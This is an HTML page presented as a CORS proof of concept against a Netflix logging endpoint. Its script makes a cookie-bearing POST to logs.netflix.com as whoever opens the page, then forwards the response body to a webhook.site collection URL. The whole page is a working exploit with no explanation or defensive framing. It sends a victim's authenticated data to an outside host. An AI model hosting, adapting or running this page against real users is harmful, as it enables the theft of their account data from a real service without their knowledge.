<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Netflix CORS POST PoC</title>
</head>
<body>
  <h1>Netflix CORS POST PoC</h1>
  <script>
    fetch('https://logs.netflix.com/', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ test: "CORS exploit" })
    })
    .then(response => response.text())
    .then(data => {
      console.log('Response:', data);
      fetch('https://webhook.site/YOUR-WEBHOOK-ID', {
        method: 'POST',
        body: data
      });
    });
  </script>
</body>
</html>
